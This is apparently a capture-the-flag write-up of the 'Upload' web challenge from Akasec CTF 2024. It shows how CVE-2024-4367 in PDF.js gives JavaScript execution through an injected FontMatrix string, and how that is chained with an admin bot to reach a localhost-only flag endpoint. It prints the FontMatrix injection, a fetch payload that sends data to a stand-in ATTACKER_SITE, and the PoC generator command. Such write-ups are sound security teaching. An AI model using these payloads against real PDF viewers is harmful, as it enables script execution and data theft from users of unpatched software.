---
name: Upload (2024)
event: Akasec CTF 2024
category: Web
description: Writeup for Upload (Web) - Akasec CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Upload

## Video walkthrough

[![VIDEO](https://img.youtube.com/vi/XrSOaHoeJCo/0.jpg)](https://www.youtube.com/watch?v=XrSOaHoeJCo "XSS in PDF.js (CVE-2024-4367) and SSRF - Upload [Akasec CTF 2024]")

## Description

> Navigate a mysterious file upload journey.

## Solution

The challenge provides two URLs. The first is a web application with `/home`, `/register` and `/login` endpoints. The other is an admin bot, so I immediately think about XSS. Before registering an account, I decided to check the source code.

### Source code

#### bot.js

I'll start with `bot.js` since there's less code, and that's where we might expect the flag to be on an XSS challenge (admin cookie). There's no flag, though; the bot simply visits a user-provided URL.

{% code overflow="wrap" %}

```js
const page = await context.newPage();
// Visit URL from user
console.log(`bot visiting ${urlToVisit}`);
await page.goto(urlToVisit, {
    waitUntil: "networkidle2",
});
await sleep(8000);
cookies = await page.cookies();
console.log(cookies);

// Close
console.log("browser close...");
await context.close();
```

{% endcode %}

#### app.js

When I opened the main app, I quickly found the flag endpoint.

{% code overflow="wrap" %}

```js
app.get("/flag", (req, res) => {
    let ip = req.connection.remoteAddress;
    if (ip === "127.0.0.1") {
        res.json({ flag: "AKASEC{FAKE_FLAG}" });
    } else {
        res.status(403).json({ error: "Access denied" });
    }
});
```

{% endcode %}

It's validating the IP to ensure the request originated from the localhost, so it looks like we've got an [SSRF](https://portswigger.net/web-security/ssrf) vulnerability. We can provide the URL to the bot; it will visit the page and get the flag in the response - simple. The question is, how can we retrieve the contents of that response?

An `/upload` endpoint allows users to upload files and then returns the URL of the hosted file.

{% code overflow="wrap" %}

```js
app.post("/upload", upload.single("file"), (req, res) => {
    const fileData = {
        filename: req.file.filename,
        path: req.file.path,
        user: req.user,
    };

    uploadfile.insert(fileData, (err, newDoc) => {
        if (err) {
            res.status(500).send(err);
        } else {
            res.redirect("/view/" + req.file.filename);
        }
    });
});
```

{% endcode %}

There's some validation on the file type allowed. - it must be PDF format.

{% code overflow="wrap" %}

```js
const upload = multer({
    storage: storage,
    fileFilter: (req, file, cb) => {
        if (file.mimetype == "application/pdf") {
            cb(null, true);
        } else {
            cb(null, false);
            return cb(new Error("Only .pdf format allowed!"));
        }
    },
});
```

{% endcode %}

### XSS

This makes me think about [Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf), so I created an account and started testing different payloads. First, I thought we might need to change the content type to `application/pdf` but keep the filename as `exploit.html`. It's easy to bypass the MIME check, but you'll see a flood of errors in the console and messages like `InvalidPDFException`. That makes sense since it's trying to render a PDF 😅 Anyway, I didn't waste much time before returning to the source code.

We want to know the type of PDF generator being used in case there are any known vulnerabilities.

{% code overflow="wrap" %}

```js
const PDFJS = require("pdfjs-dist");
```

{% endcode %}

I Googled `pdfjs-dist exploit` and the 5th result stood out to me; [CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)

> This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened. This affects **all Firefox users** (<126) because PDF.js is used by Firefox to show PDF files

> PDF.js is bundled into a Node module called `pdfjs-dist`, with ~2.7 million weekly downloads according to NPM

The blog post is around 6 weeks old, so it's a good candidate! I'd encourage you to read the complete analysis because there's a lot in there, but here are some of the key points:

-   The bug lies in the glyph (font) rendering code
-   Some fonts are handled by the browser's font renderer, e.g. TrueType
-   For more obscure fonts, PDF.js turns glyph (character) descriptions into curves on the page
-   To improve performance, a path generator function is pre-compiled for every glyph
-   The function takes a list of `cmds` (potentially dangerous if an attacker can control)
-   One of these commands is interesting (`{ cmd: "transform", args: fontMatrix.slice() },`) as it copies the array with `slice()` and inserts it into the body of the `Function` object. It's assumed to be a numeric array, so injecting a string may lead to unintended behaviour!
-   The value of `fontMatrix` defaults to `[0.001, 0, 0, 0.001, 0, 0]` but is often set to a custom matrix directly by a font (metadata)
-   Unfortunately, most PDF readers will only accept a numeric array, i.e., even if we can inject a string into the matrix within the font metadata, it won't be processed
-   Luckily, there is another way to specify a `fontMatrix` - within a PDF metadata object (instead of the font)
-   Therefore, if we insert something like `/FontMatrix [1 2 3 4 5 (cat)]` into the PDF, we'll find that `cat` is inserted directly into the function body.
-   All that's left is to take care of the syntax, leveraging the trailing parenthesis: `/FontMatrix [1 2 3 4 5 (0\); alert\('cat')]`

They provide a link to a [PDF PoC](https://codeanlabs.com/wp-content/uploads/2024/05/poc_generalized_CVE-2024-4367.pdf), so I downloaded it and uploaded it to the challenge site. It pops an alert! We can review the request in Burp to see the responsible code.

{% code overflow="wrap" %}

```js
<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] /Subtype /Type1 /Type /Font >>
```

{% endcode %}

So, how did I develop my XSS payload? I told ChatGPT I want to `fetch the contents of another page and then send them to another web server` 🤓

It initially provides some ridiculously long payloads, but through our iterative feedback (aka "shorter plz"), we guide it to produce a more reasonable one.

{% code overflow="wrap" %}

```js
fetch("/flag")
    .then((r) => r.text())
    .then((t) => fetch(`https://ATTACKER_SITE/?c=${encodeURIComponent(t)}`));
```

{% endcode %}

I got some errors and figured I wasn't escaping all the required characters, so I Googled `CVE-2024-4367 PoC` and came across another [PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC).

> A type check was missing when handling fonts in PDF.js, which would allow arbitrary JavaScript execution in the PDF.js context. This vulnerability affects Firefox < 126, Firefox ESR < 115.11, and Thunderbird < 115.11.

> If pdf.js is used to load a malicious PDF, and PDF.js is configured with isEvalSupported set to true (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.

{% code overflow="wrap" %}

```bash
python exploit.py "fetch('/flag').then(r => r.text()).then(t => fetch(`https://ATTACKER_SITE/?c=${encodeURIComponent(t)}`));"
```

{% endcode %}

The PDF was generated successfully, but I got an error about `bad substitution.` Turns out I just needed to escape some characters.

{% code overflow="wrap" %}

```bash
python exploit.py "fetch('/flag').then(r => r.text()).then(t => fetch(\`ATTACKER_SITE/?c=\${encodeURIComponent(t)}\`));"
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
```

{% endcode %}

When I upload the PDF and visit the URL, my browser console and web server logs are filled with errors.

{% code overflow="wrap" %}

```bash
200		GET	/?c=%7B%22error%22%3A%22Access%20denied%22%7D
```

{% endcode %}

### SSRF

Now that we know we can exfiltrate the HTTP response, we just need to share the link of our note with the admin/bot. The XSS exploit will _forge_ a _request_ to the `/flag` endpoint, and since it comes from the _server-side_ (localhost), the validation check will pass.

_Note:_ Maybe this is technically CSRF since the bot simulates an admin user, and the request happens via the headless Chrome browser rather than directly on the server? Then again, the admin bot code is technically on the server side, and the validation function checks that the request came from the server side (localhost), so I'm labelling it SSRF for now! Let me know if you disagree ✅

Regardless, the XSS payload will subsequently issue a request to our server, with the response included in the GET parameter.

{% code overflow="wrap" %}

```bash
200		GET	/?c=%7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3%7D%22%7D
```

{% endcode %}

The final step is to URL-decode the flag.

{% code overflow="wrap" %}

```bash
urldecode %7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3%7D%22%7D
{"flag":"AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}"}
```

{% endcode %}

Flag: `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}` 🕊✌
